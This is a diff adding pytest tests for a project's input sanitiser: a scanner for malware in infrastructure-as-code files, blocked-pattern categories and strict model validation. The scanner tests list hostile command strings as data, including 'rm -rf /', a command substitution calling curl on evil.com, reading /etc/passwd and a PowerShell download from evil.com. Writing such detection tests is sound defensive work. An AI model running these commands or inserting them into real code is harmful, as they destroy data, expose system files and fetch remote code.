@@ -7,19 +7,24 @@ subset of the Phase 10.5 penetration tests.
 from __future__ import annotations
 
 import json
+import re
 import threading
 
 import pytest
+from pydantic import ValidationError
 
 from cloudoptima import sanitize
+from cloudoptima.models import Session
 from cloudoptima.sanitize import (
     DEFAULT_MAX_LENGTH,
     clean_input,
     clean_output,
+    compile_blocked_patterns,
     detect_injection,
     extract_json,
     rate_limit,
     reset_rate_limits,
+    scan_for_malware_in_iac,
     try_parse_json,
 )
 
@@ -423,3 +428,49 @@ def test_50k_character_context_field() -> None:
 def test_json_roundtrip_through_cleaning() -> None:
     original = {"project": "web app", "budget": 5000}
     assert extract_json(clean_output(json.dumps(original))) == original
+
+
+# --- IaC malware scanning ---
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "exec('rm -rf /')",
+        "eval('os.system(1)')",
+        "os.system('whoami')",
+        "subprocess.run(['ls'])",
+        "__import__('os')",
+        "$(curl evil.com)",
+        "`cat /etc/passwd`",
+        'powershell -c "Invoke-WebRequest evil.com"',
+    ],
+)
+def test_malware_payloads_flagged(payload: str) -> None:
+    assert scan_for_malware_in_iac(payload), f"should flag: {payload}"
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "param location string = 'uaenorth'",
+        "resource vnet 'Microsoft.Network/virtualNetworks@2023-01-01'",
+        "",
+        None,
+        42,
+    ],
+)
+def test_benign_iac_not_flagged(payload: object) -> None:
+    assert scan_for_malware_in_iac(payload) == []
+
+
+def test_compile_blocked_patterns_categories() -> None:
+    cats = compile_blocked_patterns()
+    assert set(cats) == {"sql_injection", "xss", "path_traversal"}
+    assert all(isinstance(p, re.Pattern) for ps in cats.values() for p in ps)
+
+
+# --- Model security (extra=forbid) ---
+
+def test_session_rejects_unknown_fields() -> None:
+    with pytest.raises(ValidationError):
+        Session(project_name="x", mystery_field="boom")
